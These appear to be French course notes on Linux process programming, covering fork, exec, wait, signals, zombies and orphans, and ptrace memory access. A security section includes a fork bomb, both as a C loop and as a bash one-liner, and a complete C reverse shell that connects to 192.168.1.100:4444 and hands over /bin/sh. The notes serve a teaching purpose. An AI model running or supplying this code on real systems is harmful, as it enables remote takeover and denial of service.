# Cours 02 : Processus Linux

## fork() - Créer un Processus

```c
#include <unistd.h>
#include <sys/wait.h>

pid_t pid = fork();

if (pid < 0) {
    perror("fork failed");
    exit(1);
} else if (pid == 0) {
    // Code du processus ENFANT
    printf("Je suis l'enfant, PID: %d\n", getpid());
    exit(0);
} else {
    // Code du processus PARENT
    printf("Je suis le parent, enfant PID: %d\n", pid);
    wait(NULL);  // Attendre la fin de l'enfant
}
```

## exec() - Remplacer le Programme

```c
#include <unistd.h>

// execve - Le plus bas niveau
char *argv[] = {"/bin/ls", "-la", NULL};
char *envp[] = {"PATH=/usr/bin", NULL};
execve("/bin/ls", argv, envp);
// Si execve réussit, ne retourne jamais!

// Variantes pratiques
execl("/bin/ls", "ls", "-la", NULL);      // Liste d'args
execlp("ls", "ls", "-la", NULL);          // Cherche dans PATH
execv("/bin/ls", argv);                    // Tableau d'args
execvp("ls", argv);                        // PATH + tableau
```

## fork() + exec() Pattern

```c
pid_t pid = fork();
if (pid == 0) {
    // Enfant : remplacer par un autre programme
    execlp("ls", "ls", "-la", NULL);
    perror("exec failed");  // Seulement si exec échoue
    exit(1);
}
// Parent continue...
wait(NULL);
```

## wait() - Attendre un Enfant

```c
#include <sys/wait.h>

int status;
pid_t child_pid = wait(&status);  // Attend n'importe quel enfant

// Ou un enfant spécifique
waitpid(pid, &status, 0);

// Analyser le status
if (WIFEXITED(status)) {
    printf("Terminé avec code: %d\n", WEXITSTATUS(status));
}
if (WIFSIGNALED(status)) {
    printf("Tué par signal: %d\n", WTERMSIG(status));
}
```

## kill() - Envoyer un Signal

```c
#include <signal.h>

kill(pid, SIGTERM);  // Demander terminaison propre
kill(pid, SIGKILL);  // Forcer terminaison (ne peut pas être ignoré)
kill(pid, SIGSTOP);  // Suspendre
kill(pid, SIGCONT);  // Reprendre
```

## Processus Zombie et Orphelin

```c
// ZOMBIE : enfant terminé mais parent n'a pas appelé wait()
pid_t pid = fork();
if (pid == 0) {
    exit(0);  // Enfant se termine
}
sleep(60);   // Parent ne fait pas wait() → enfant zombie

// ORPHELIN : parent termine avant l'enfant
pid_t pid = fork();
if (pid == 0) {
    sleep(60);  // Enfant continue
} else {
    exit(0);    // Parent termine → enfant adopté par init (PID 1)
}
```

## Application Sécurité : Fork Bomb

```c
// NE PAS EXÉCUTER! Déni de service
while (1) {
    fork();
}
// Ou en bash: :(){ :|:& };:
```

## Application : Reverse Shell Simple

```c
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void) {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    addr.sin_addr.s_addr = inet_addr("192.168.1.100");

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    connect(sock, (struct sockaddr*)&addr, sizeof(addr));

    // Rediriger stdin/stdout/stderr vers le socket
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    // Lancer un shell
    execve("/bin/sh", NULL, NULL);
    return 0;
}
```

## ptrace - Contrôler un Processus

```c
#include <sys/ptrace.h>

// Attacher à un processus
ptrace(PTRACE_ATTACH, pid, NULL, NULL);
wait(NULL);  // Attendre que le processus s'arrête

// Lire les registres
struct user_regs_struct regs;
ptrace(PTRACE_GETREGS, pid, NULL, &regs);
printf("RIP: 0x%llx\n", regs.rip);

// Lire la mémoire
long data = ptrace(PTRACE_PEEKDATA, pid, address, NULL);

// Écrire en mémoire
ptrace(PTRACE_POKEDATA, pid, address, new_value);

// Continuer l'exécution
ptrace(PTRACE_CONT, pid, NULL, NULL);

// Détacher
ptrace(PTRACE_DETACH, pid, NULL, NULL);
```
